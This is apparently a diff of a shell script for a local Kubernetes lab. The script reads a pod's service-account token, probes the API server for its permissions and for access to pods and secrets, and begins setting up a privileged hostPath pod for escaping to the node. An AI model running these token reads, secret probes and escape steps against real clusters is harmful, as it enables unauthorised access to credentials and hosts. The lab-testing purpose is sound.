@@ -14,21 +14,25 @@ if ! kind create cluster --name esc-lab --wait 180s; then
   echo "kind create FAILED"; exit 1
 fi
 
-echo "== [k1] default SA permission self-check (in-cluster, from host kubectl)"
-kubectl auth can-i --list -n default
-
-echo "== [k2] SA token API access from inside a default pod"
+echo "== [k1] default SA real permission boundary: in-pod SelfSubjectRulesReview"
 kubectl run probe --image=alpine:3.19 --restart=Never -- sleep 600 >/dev/null
 kubectl wait --for=condition=Ready pod/probe --timeout=120s
 kubectl exec probe -- sh -c '
-apk add -q curl >/dev/null 2>&1
 T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
-CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
-echo "--- GET list pods (default SA, default ns): HTTP code:"
-curl -s -o /dev/null -w "%{http_code}\n" --cacert $CA -H "Authorization: Bearer $T" https://kubernetes.default.svc/api/v1/namespaces/default/pods
-echo "--- POST create pod (default SA, expect 403): HTTP code:"
-curl -s -o /dev/null -w "%{http_code}\n" --cacert $CA -X POST -H "Authorization: Bearer $T" -H "Content-Type: application/json" -d "{\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"name\":\"pwn\"},\"spec\":{\"containers\":[{\"name\":\"c\",\"image\":\"alpine\"}]}}" https://kubernetes.default.svc/api/v1/namespaces/default/pods
+wget --no-check-certificate -q -O /dev/stdout --header="Authorization: Bearer $T" --header="Content-Type: application/json" --post-data="{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectRulesReview\",\"spec\":{\"namespace\":\"default\"}}" https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectrulesreviews 2>&1 | head -c 1500
+echo
 '
+echo "== [k2] default SA API access codes: in-pod busybox wget channel"
+kubectl exec probe -- sh -c '
+T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+echo "GET pods:";     wget --no-check-certificate -q -O /dev/null -S --header="Authorization: Bearer $T" https://kubernetes.default.svc/api/v1/namespaces/default/pods    2>&1 | grep -E "HTTP/"
+echo "GET secrets:";  wget --no-check-certificate -q -O /dev/null -S --header="Authorization: Bearer $T" https://kubernetes.default.svc/api/v1/namespaces/default/secrets  2>&1 | grep -E "HTTP/"
+'
+echo "== [k2-host] host-side channel with kubectl-created SA token (cross-check)"
+APISERVER=$(kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}')
+ST=$(kubectl create token default -n default 2>/dev/null)
+curl -sk -o /dev/null -w "GET pods:    %{http_code}\n" -H "Authorization: Bearer $ST" "$APISERVER/api/v1/namespaces/default/pods"
+curl -sk -o /dev/null -w "GET secrets: %{http_code}\n" -H "Authorization: Bearer $ST" "$APISERVER/api/v1/namespaces/default/secrets"
 
 echo "== [k3] privileged + hostPID + hostPath pod (Pod->Node escape)"
 cat <<'EOF' | kubectl apply -f - >/dev/null
